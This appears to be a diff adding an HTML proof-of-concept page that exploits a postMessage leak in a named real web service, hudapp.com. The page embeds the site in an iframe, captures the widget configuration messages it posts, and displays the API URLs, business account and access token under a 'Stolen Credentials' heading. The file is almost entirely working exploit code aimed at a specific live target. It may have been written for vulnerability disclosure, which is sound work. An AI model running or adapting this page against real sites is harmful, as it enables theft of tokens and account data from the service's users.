@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>HUD App Data Theft PoC</title>
+    <style>
+        body { font-family: Arial, sans-serif; max-width: 1000px; margin: 0 auto; padding: 20px; }
+        #container { display: flex; flex-direction: column; gap: 20px; }
+        iframe { width: 100%; height: 600px; border: 1px solid #ccc; }
+        #results { padding: 15px; background: #f8f8f8; border: 1px solid #e0e0e0; }
+        .cred-item { margin-bottom: 10px; padding: 10px; background: #fff; border-left: 3px solid #4CAF50; }
+        .key { font-weight: bold; color: #333; }
+        .value { color: #d32f2f; word-break: break-all; }
+    </style>
+</head>
+<body>
+    <h1>HUD App Sensitive Data Exfiltration PoC</h1>
+    <div id="container">
+        <iframe src="https://www.hudapp.com"></iframe>
+        <div id="results">
+            <h2>Stolen Credentials:</h2>
+            <div id="credentials"></div>
+        </div>
+    </div>
+
+    <script>
+        // Listen for messages from the embedded HUD App
+        window.addEventListener('message', (event) => {
+            if (event.data.method === 'postMessagePlatformWidget') {
+                const sensitiveData = event.data.data;
+                
+                // Display stolen data
+                const credentialsDiv = document.getElementById('credentials');
+                credentialsDiv.innerHTML = '';
+                
+                // Extract and display critical credentials
+                const criticalData = {
+                    'Widget ID': sensitiveData.public_id,
+                    'API Endpoint': sensitiveData.settings.apiUrl,
+                    'Storage API': sensitiveData.settings.storageApiUrl,
+                    'Business Account': sensitiveData.settings.businessAccount,
+                    'Access Token': sensitiveData.settings.accessToken || 'Present but hidden in this demo',
+                    'App Version': sensitiveData.app_version,
+                    'Template ID': sensitiveData.settings.template
+                };
+                
+                for (const [key, value] of Object.entries(criticalData)) {
+                    const div = document.createElement('div');
+                    div.className = 'cred-item';
+                    div.innerHTML = `<span class="key">${key}:</span> 
+                                     <span class="value">${value || 'N/A'}</span>`;
+                    credentialsDiv.appendChild(div);
+                }
+                
+                // Show full stolen payload (hidden by default)
+                const rawData = document.createElement('div');
+                rawData.innerHTML = `<h3>Full Configuration:</h3>
+                    <button onclick="this.nextSibling.style.display='block';this.style.display='none'">
+                        Show Full Payload
+                    </button>
+                    <pre style="display:none;background:#333;color:#fff;padding:15px;">${
+                        JSON.stringify(sensitiveData, null, 2)
+                    }</pre>`;
+                credentialsDiv.appendChild(rawData);
+            }
+        });
+    </script>
+</body>
+</html>
